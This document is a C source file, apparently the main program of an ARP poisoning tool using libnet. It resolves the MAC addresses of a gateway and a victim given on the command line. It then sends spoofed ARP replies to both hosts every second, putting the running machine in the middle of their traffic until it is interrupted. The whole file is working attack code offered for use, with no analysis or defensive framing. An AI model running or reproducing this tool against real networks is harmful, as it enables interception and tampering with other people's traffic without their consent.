#include "arp_tools.h"
#define SYS_ERR(x, msg) do {if (x == -1){\
  perror(msg); exit(EXIT_FAILURE);}\
} while(false);
#define USAGE(x) do {if(!x){\
  fprintf(stderr, "USAGE: ./main <gw ip> <victim ip> <device>\n"); \
  exit(EXIT_FAILURE);}\
}while(false)

extern pcap_t * handle;
u_int32_t target_ip = 0;
struct libnet_ether_addr * target_mac = NULL;
struct libnet_ether_addr * my_mac = NULL;
u_int32_t gw_ip;
u_int32_t victim_ip;
struct sigaction sig;
volatile sig_atomic_t signaled = false;

void handler(const int signum __attribute__((unused)))
{
  printf(ANSI_COLOR_RED "\n[!] Program quit\n" ANSI_COLOR_RESET);
  signaled = true;
}

int main(int argc, char * argv[])
{
  USAGE((argc == 4));
  u_char broadcastEther[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  libnet_t * l1;
  struct libnet_ether_addr * gw_mac = NULL;
  struct libnet_ether_addr * victim_mac = NULL;
  char errbuf[LIBNET_ERRBUF_SIZE];

  const char * device = argv[3];
  sig.sa_handler = handler;
  sig.sa_flags = 0;
  sigemptyset(&sig.sa_mask);

  target_mac = (struct libnet_ether_addr*) malloc(sizeof(struct libnet_ether_addr));
  gw_mac = (struct libnet_ether_addr*) malloc(sizeof(struct libnet_ether_addr));
  victim_mac = (struct libnet_ether_addr*) malloc(sizeof(struct libnet_ether_addr));

  if ((l1 = libnet_init(LIBNET_LINK, device, errbuf)) == NULL)
  {
    fprintf(stderr, "libnet_init() error : %s\n", errbuf);
    exit(EXIT_FAILURE);
  }

  u_int32_t my_ip = get_src_ip(l1);
  my_mac = get_src_mac(l1);

  memset(errbuf, 0, strlen(errbuf));
  target_ip = inet_addr(argv[1]);

  #pragma omp parallel sections num_threads(2) 
  {
    #pragma omp section
      find_target_mac(l1);
    #pragma omp section
    {
      puts("[*] Searching for gateway MAC address");
      sleep(1);
      build_arp_request(my_mac, &my_ip, &target_ip, (struct libnet_ether_addr *) broadcastEther, l1);
      libnet_write(l1);
    }
  }

  memcpy(gw_mac->ether_addr_octet, target_mac->ether_addr_octet, 6);
  printf("[+] gateway MAC : %s\n", ether_ntoa((struct ether_addr*) gw_mac));
  gw_ip = target_ip;

  target_ip = inet_addr(argv[2]);

  #pragma omp parallel sections num_threads(2) 
  {
    #pragma omp section
      find_target_mac(l1);
    #pragma omp section 
    {
      puts("[*] Searching for victim MAC address");
      sleep(1);
      build_arp_request(my_mac, &my_ip, &target_ip, (struct libnet_ether_addr *) broadcastEther, l1);
      libnet_write(l1);
    }
  }

  memcpy(victim_mac->ether_addr_octet, target_mac->ether_addr_octet, 6);
  printf("[+] victim MAC : %s\n", ether_ntoa((struct ether_addr*) victim_mac));
  victim_ip = target_ip;

  printf(ANSI_COLOR_YELLOW "ARP poisoning Started\n" ANSI_COLOR_RESET);
  sigaction(SIGINT, &sig, NULL);
  while(!signaled)
  {
    printf("[*] advertising fake address to: %s\n", ether_ntoa((struct ether_addr*) victim_mac));
    spoof_addr(l1, &victim_ip, &gw_ip, my_mac, victim_mac);
    libnet_write(l1);
    libnet_clear_packet(l1);
    printf("[*] advertising fake address to: %s\n", ether_ntoa((struct ether_addr*) gw_mac));
    spoof_addr(l1, &gw_ip, &victim_ip, my_mac, gw_mac);
    libnet_write(l1);
    libnet_clear_packet(l1);
    sleep(1);
  }

  libnet_destroy(l1);
  free(target_mac);
  free(gw_mac);
  free(victim_mac);

  exit(EXIT_SUCCESS);
}
